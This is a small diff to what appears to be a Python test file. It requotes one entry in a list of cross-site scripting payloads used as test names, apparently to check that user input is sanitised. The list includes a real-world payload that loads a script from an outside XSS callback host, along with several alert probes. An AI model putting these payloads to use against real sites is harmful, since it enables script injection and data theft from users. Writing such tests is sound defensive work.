@@ -14,7 +14,7 @@ from orchestra.tests.utils import ADMIN_HEADERS, create_test_user
 
 # Sample of the real-world payload plus minimal angle-bracket cases.
 XSS_NAMES = [
-    '"><h1>albus dumbledore</h1><img/src/onerror=import(\'//xss.report/c/a8x\')>',
+    "\"><h1>albus dumbledore</h1><img/src/onerror=import('//xss.report/c/a8x')>",
     "<script>alert(document.domain)</script>",
     "<img src=x onerror=alert(1)>",
     "Acme <b>Corp</b>",
